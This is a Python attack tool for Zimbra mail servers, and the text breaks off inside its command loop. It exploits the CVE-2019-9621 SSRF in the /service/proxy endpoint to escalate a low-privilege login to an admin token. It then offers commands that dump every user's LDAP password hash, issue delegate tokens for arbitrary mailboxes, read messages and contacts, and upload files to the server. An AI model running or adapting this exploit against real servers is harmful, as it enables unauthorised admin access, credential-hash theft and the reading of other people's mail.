#coding=utf8
import sys
import requests
import re
from requests_toolbelt import MultipartEncoder
import warnings
warnings.filterwarnings("ignore")

def auth_request_low(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">              
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        r=requests.post(uri+"/service/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
        if 'authentication failed' in r.text:
          print("[-] Authentication failed for %s"%(username))
          exit(0)
        elif 'authToken' in r.text:
          pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
          token = pattern_auth_token.findall(r.text)[0]
          print("[+] Authentication success for %s"%(username))
          print("[*] authToken_low:%s"%(token))
          return token
        else:
          print("[!]")
          print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
   
def auth_request_admin(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">            
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAdmin">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
        if 'authentication failed' in r.text:
          print("[-] Authentication failed for %s"%(username))
          exit(0)
        elif 'authToken' in r.text:
          pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
          token = pattern_auth_token.findall(r.text)[0]
          print("[+] Authentication success for %s"%(username))
          print("[*] authToken_admin:%s"%(token))
          return token
        else:
          print("[!]")
          print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def lowtoken_to_admintoken_by_SSRF(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="{xmlns}">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Try to auth for low token")
    try:
        r=requests.post(uri+"/service/soap",data=request_body.format(xmlns="urn:zimbraAccount",username=username,password=password),verify=False)
        if 'authentication failed' in r.text:
          print("[-] Authentication failed for %s"%(username))
          exit(0)
        elif 'authToken' in r.text:
          pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
          low_token = pattern_auth_token.findall(r.text)[0]
          print("[+] Authentication success for %s"%(username))
          print("[*] authToken_low:%s"%(low_token))
          headers = {
          "Content-Type":"application/xml"
          }
          headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_token+";"
          headers["Host"]="foo:7071"
          print("[*] Try to get admin token by SSRF(CVE-2019-9621)")    
          s = requests.session()
          r = s.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(xmlns="urn:zimbraAdmin",username=username,password=password),headers=headers,verify=False)
          if 'authToken' in r.text:
              admin_token =pattern_auth_token.findall(r.text)[0]
              print("[+] Success for SSRF")
              print("[+] ADMIN_TOKEN: "+admin_token)
              return admin_token
          else:
              print("[-] SSRF failed")
              exit(0)
        else:
          print("[!]")
          print(r.text)
          exit(0)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
  
def getalldomains_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
         </GetAllDomainsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
      print("[*] Try to get all domain names")
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
      if "name" in r.text:
        pattern_name = re.compile(r"zimbraDomainName\">(.*?)<")
        name = pattern_name.findall(r.text)
        for i in range(len(name)):       
          print("[+] Domain name: %s"%(name[i]))
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalldomains_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
         </GetAllDomainsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
      print("[*] Try to get all domain names")
      r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
      if "name" in r.text:
        pattern_name = re.compile(r"zimbraDomainName\">(.*?)<")
        name = pattern_name.findall(r.text)
        for i in range(len(name)):       
          print("[+] Domain name: %s"%(name[i]))
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallaccounts_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all accounts")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)     
        for i in range(len(name)):
          print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getallaccounts_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all accounts")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)     
        for i in range(len(name)):
          print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getalladminaccounts_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAdminAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAdminAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """   
    try:
        print("[*] Try to get all admin accounts")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)      
        for i in range(len(name)):
          print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getalladminaccounts_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAdminAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAdminAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all admin accounts")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)      
        for i in range(len(name)):
          print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getallmailboxes_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllMailboxesRequest xmlns="urn:zimbraAdmin">
         </GetAllMailboxesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all mailboxes")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
        pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)
        for id in accountId:
          print("[+] accountId:%s"%(id))

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getallmailboxes_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllMailboxesRequest xmlns="urn:zimbraAdmin">
         </GetAllMailboxesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all mailboxes")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
        pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)
        for id in accountId:
          print("[+] accountId:%s"%(id))

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getmailbox_request(uri,token,id):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMailboxRequest xmlns="urn:zimbraAdmin">
            <mbox>
              <id>{id}</id>
            </mbox>
         </GetMailboxRequest>
       </soap:Body>
    </soap:Envelope>
    """   
    try:
        print("[*] Try to get mailbox of %s"%(id))
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getmemcachedconfig_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </GetMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get memcached config")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
        if "serverList" in r.text:
          pattern_config = re.compile(r"serverList=\"(.*?)\"")
          config = pattern_config.findall(r.text)[0]
          print("[+] ServerList: "+config)
        else:
          print("[!]")
          print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getmemcachedconfig_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </GetMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get memcached config")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
        if "serverList" in r.text:
          pattern_config = re.compile(r"serverList=\"(.*?)\"")
          config = pattern_config.findall(r.text)[0]
          print("[+] ServerList: "+config)
        else:
          print("[!]")
          print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)       

def getldapentries_request(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get LDAP Entries of %s"%(query))
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getldapentries_requestSSRF(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get LDAP Entries of %s"%(query))
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),headers=headers,verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getalluserhash(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get all users' hash")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
        if 'userPassword' in r.text:
          pattern_data = re.compile(r"userPass(.*?)objectClass")
          data = pattern_data.findall(r.text)   
          for i in range(len(data)):
              pattern_user = re.compile(r"mail\">(.*?)<")
              user = pattern_user.findall(data[i])
              pattern_password = re.compile(r"word\">(.*?)<")  
              password = pattern_password.findall(data[i])  
              print("[+] User:%s"%(user[0]))  
              print("    Hash:%s"%(password[0]))
        else:
          print("[!]")
          print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getalluserhashSSRF(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all users' hash")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),headers=headers,verify=False,timeout=15)
        if 'userPassword' in r.text:
          pattern_data = re.compile(r"userPass(.*?)objectClass")
          data = pattern_data.findall(r.text)   
          for i in range(len(data)):
              pattern_user = re.compile(r"mail\">(.*?)<")
              user = pattern_user.findall(data[i])
              pattern_password = re.compile(r"word\">(.*?)<")  
              password = pattern_password.findall(data[i])  
              print("[+] User:%s"%(user[0]))  
              print("    Hash:%s"%(password[0]))
        else:
          print("[!]")
          print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def gettoken_request(uri,token):
    print("[*] Input the mailbox:")
    mail = input("[>]: ")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
            <account by="name">{mail}</account>        
         </DelegateAuthRequest>
       </soap:Body>
    </soap:Envelope>
    """    
    try:
        print("[*] Try to get the token")
        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
        if 'authToken' in r.text:
            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_token.findall(r.text)
            print("[+] authTOken:%s"%(token[0]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def gettoken_requestSSRF(uri,token):
    print("[*] Input the mailbox:")
    mail = input("[>]: ")
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
            <account by="name">{mail}</account>        
         </DelegateAuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers = {
    "Content-Type":"application/xml"
    }
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get the token")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,mail=mail),headers=headers,verify=False,timeout=15)
        if 'authToken' in r.text:
            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_token.findall(r.text)
            print("[+] authTOken:%s"%(token[0]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def upload_request(uri,token):
    fileContent = 0;
    path = input("[*] Input the path of the file:")
    with open(path,'r') as f:
        fileContent = f.read()
    filename = path
    print("[*] filepath:"+path)
    print("[*] filedata:"+fileContent)

    headers = {
    "Content-Type":"application/xml"
    }   
    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"

    m = MultipartEncoder(fields={
    'filename1':(None,"test",None),
    'clientFile':(filename,fileContent,"image/jpeg"),
    'requestId':(None,"12345",None),
    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')

    r = requests.post(uri+"/service/extension/clientUploader/upload",data=m,headers=headers,verify=False)
    if 'window.parent._uploadManager.loaded(1,' in r.text:
        print("[+] Upload Success!")
        print("[+] URL:%s/downloads/%s"%(uri,filename))
    else:
        print("[!]")
        print(r.text)  
        exit(0)

def getalladdresslists_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAddressListsRequest  xmlns="urn:zimbraAccount"> 
         </GetAllAddressListsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all address lists")
        r=requests.post(uri+"/service/soap",data=request_body.format(token=token),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getcontacts_request(uri,token,email):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetContactsRequest xmlns="urn:zimbraMail">
            <a n="email">{email}</a>
         </GetContactsRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get contacts")
        r=requests.post(uri+"/service/soap",data=request_body.format(token=token,email=email),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])      
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getfolder_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetFolderRequest xmlns="urn:zimbraMail"> 
         </GetFolderRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get folder")
        r=requests.post(uri+"/service/soap",data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_size = re.compile(r" n=\"(.*?)\"")
        size = pattern_size.findall(r.text)      
        for i in range(len(name)):
          print("[+] Name:%s,Size:%s"%(name[i],size[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getitem_request(uri,token,path):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetItemRequest xmlns="urn:zimbraMail"> 
            <item>
                <path>{path}</path>
            </item>
         </GetItemRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get item of %s"%(path))
        r=requests.post(uri+"/service/soap",data=request_body.format(token=token,path=path),verify=False,timeout=15)
        pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
        data = pattern_data.findall(r.text)
        print(data[0])
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def getmsg_request(uri,token,id):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMsgRequest xmlns="urn:zimbraMail"> 
            <m>
                <id>{id}</id>
            </m>
         </GetMsgRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get msg")
        r=requests.post(uri+"/service/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

if __name__ == '__main__':
  if len(sys.argv)!=5:
    print("\nUse Zimbra SOAP API to connect the Zimbra mail server.")
    print("Author:3gstudent")   
    print("Usage:")
    print("      %s <url> <username> <password> <mode>"%(sys.argv[0]))
    print("mode:")
    print("      low       auth for low token")   
    print("      admin     auth for admin token")
    print("      ssrf      Use CVE-2019-9621 to get the admin token")
    print("Eg:")
    print("      %s https://192.168.1.1 user1@mail.zimbra password low"%(sys.argv[0]))
    print("      %s https://192.168.1.1 zimbra password ssrf"%(sys.argv[0]))    
    sys.exit(0)
  else:
    if sys.argv[4]=='low':
      print("[*] Try to auth for low token")
      low_token = auth_request_low(sys.argv[1],sys.argv[2],sys.argv[3]) 
      print("[*] Command Mode")
      print("    Supprot command:")
      print("      GetAllAddressLists")
      print("      GetContacts")
      print("      GetFolder")
      print("      GetItem <path>,Eg:GetItem /Inbox")
      print("      GetMsg <MessageID>,Eg:GetMsg 259")
      print("      help")
      print("      exit")
      while(1):
        cmd = input("[$] ")
        if cmd=='help':
          print("Supprot command:")
          print("      GetAllAddressLists")
          print("      GetContacts")
          print("      GetFolder")
          print("      GetItem <path>,Eg:GetItem /Inbox")
          print("      GetMsg <MessageID>,Eg:GetMsg 259")
          print("      help")
          print("      exit")
        elif cmd=='GetAllAddressLists':
          getalladdresslists_request(sys.argv[1],low_token)
        elif cmd=='GetContacts':
          getcontacts_request(sys.argv[1],low_token,sys.argv[2])
        elif cmd=='GetFolder':
          getfolder_request(sys.argv[1],low_token)
        elif 'GetItem' in cmd:
          cmdlist = cmd.split(' ')
          getitem_request(sys.argv[1],low_token,cmdlist[1])
        elif 'GetMsg' in cmd:
          cmdlist = cmd.split(' ')
          getmsg_request(sys.argv[1],low_token,cmdlist[1])
        elif cmd=='exit':
          exit(0)
        else:
          print("[!] Wrong parameter")

    elif sys.argv[4]=='admin':
      print("[*] Try to auth for admin token")
      admin_token = auth_request_admin(sys.argv[1],sys.argv[2],sys.argv[3])
      print("[*] Command Mode")
      print("Supprot command:")
      print("      GetAllDomains")      
      print("      GetAllMailboxes")
      print("      GetAllAccounts")
      print("      GetAllAdminAccounts")
      print("      GetMemcachedClientConfig")
      print("      GetLDAPEntries")
      print("      GetToken")      
      print("      getalluserhash")
      print("      upload")
      print("      help")
      print("      exit")
      while(1):
        cmd = input("[$] ")
        if cmd=='help':
          print("Supprot command:")
          print("      GetAllDomains")
          print("      GetAllMailboxes")
          print("      GetAllAccounts")
          print("      GetAllAdminAccounts")
          print("      GetMemcachedClientConfig")
          print("      GetLDAPEntries")
          print("      GetToken")      
          print("      getalluserhash")
          print("      upload")
          print("      help")
          print("      exit")         
        elif cmd=='GetAllDomains':          
          getalldomains_request(sys.argv[1],admin_token)
        elif cmd=='GetAllMailboxes':
          getallmailboxes_request(sys.argv[1],admin_token)
        elif cmd=='GetAllAccounts':
          getallaccounts_request(sys.argv[1],admin_token)
        elif cmd=='GetAllAdminAccounts':
          getalladminaccounts_request(sys.argv[1],admin_token)
        elif cmd=='GetMemcachedClientConfig':
          getmemcachedconfig_request(sys.argv[1],admin_token)
        elif cmd=='GetLDAPEntries':
          print("[*] Input the ldapSearchBase1:")
          print("Eg.")
          print("cn=*")
          ldapSearchBase1 = input("[>]:")
          print("[*] Input the ldapSearchBase2:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase2 = input("[>]:")
          getldapentries_request(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
        elif cmd=='getalluserhash':
          print("[*] Input the ldapSearchBase:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase = input("[>]:")          
          getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
        elif cmd=='GetToken':
          gettoken_request(sys.argv[1],admin_token)
        elif cmd=='upload':
          upload_request(sys.argv[1],admin_token)            
        elif cmd=='exit':
          exit(0)
        else:
          print("[!] Wrong parameter")

    elif sys.argv[4]=='ssrf':
      print("[*] Try to use CVE-2019-9621 to get the admin token")
      admin_token = lowtoken_to_admintoken_by_SSRF(sys.argv[1],sys.argv[2],sys.argv[3])
      print("[*] Command Mode")
      print("Supprot command:")
      print("      GetAllDomains")
      print("      GetAllMailboxes")
      print("      GetAllAccounts")
      print("      GetAllAdminAccounts")
      print("      GetMemcachedClientConfig")
      print("      GetLDAPEntries")
      print("      GetToken")      
      print("      getalluserhash")
      print("      upload")
      print("      GetAllDomainsSSRF")
      print("      GetAllMailboxesSSRF")
      print("      GetAllAccountsSSRF")
      print("      GetAllAdminAccountsSSRF")
      print("      GetMemcachedClientConfigSSRF")
      print("      GetLDAPEntriesSSRF")
      print("      GetTokenSSRF")      
      print("      getalluserhashSSRF")
      print("      help")
      print("      exit")
      while(1):
        cmd = input("[$] ")
        if cmd=='help':
          print("Supprot command:")
          print("      GetAllDomains")
          print("      GetAllMailboxes")
          print("      GetAllAccounts")
          print("      GetAllAdminAccounts")
          print("      GetMemcachedClientConfig")
          print("      GetLDAPEntries")
          print("      GetToken")      
          print("      getalluserhash")
          print("      upload")
          print("      GetAllDomainsSSRF")
          print("      GetAllMailboxesSSRF")
          print("      GetAllAccountsSSRF")
          print("      GetAllAdminAccountsSSRF")
          print("      GetMemcachedClientConfigSSRF")
          print("      GetLDAPEntriesSSRF")
          print("      GetTokenSSRF")      
          print("      getalluserhashSSRF")          
          print("      help")
          print("      exit")
        elif cmd=='GetAllDomains':          
          getalldomains_request(sys.argv[1],admin_token)
        elif cmd=='GetAllMailboxes':
          getallmailboxes_request(sys.argv[1],admin_token)
